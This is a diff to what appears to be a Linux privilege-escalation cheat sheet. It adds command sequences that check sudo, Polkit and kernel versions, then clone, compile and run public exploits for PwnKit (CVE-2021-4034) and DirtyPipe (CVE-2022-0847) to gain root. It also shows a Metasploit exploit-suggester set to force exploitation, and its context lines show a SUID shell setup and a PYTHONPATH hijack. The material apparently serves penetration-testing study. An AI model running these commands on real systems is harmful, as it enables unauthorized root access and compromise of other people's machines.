@@ -303,6 +303,8 @@ chmod u+s /mnt/shell
 # Kernel Exploit
 ```powershell
 linux-exploit-suggester.sh
+
+msf exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
 ```
 
 # Shared Libraries
@@ -459,4 +461,46 @@ sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py
 
 # Python /tmp-də psutil.py tapır və onu import edir!
 # uid=0(root) gid=0(root) groups=0(root)
+```
+
+# SUDO
+```powershell
+sudo cat /etc/sudoers | grep -v "#" | sed -r '/^\s*$/d'
+
+sudo -V | head -n1 --> Search SUDO PoC Exploit
+
+msf exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
+set AutoCheck false
+set ForceExploit true
+```
+
+# Polkit
+```powershell
+pkexec --version      0.120 > Dangerous
+
+ls -l /usr/bin/pkexec     -rwsr-xr-x --> Dangerous
+
+./linpeas.sh | grep -i "pwnkit"
+
+git clone https://github.com/arthepsy/CVE-2021-4034.git
+cd CVE-2021-4034
+
+gcc cve-2021-4034-poc.c -o poc
+```
+
+# DirtyPipe
+```powershell
+uname -r       5.8 <= version < 5.17
+
+git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
+cd CVE-2022-0847-DirtyPipe-Exploits
+bash compile.sh
+
+./exploit-1
+
+
+find / -perm -4000 2>/dev/null
+   /usr/bin/sudo
+
+./exploit-2 /usr/bin/sudo
 ```
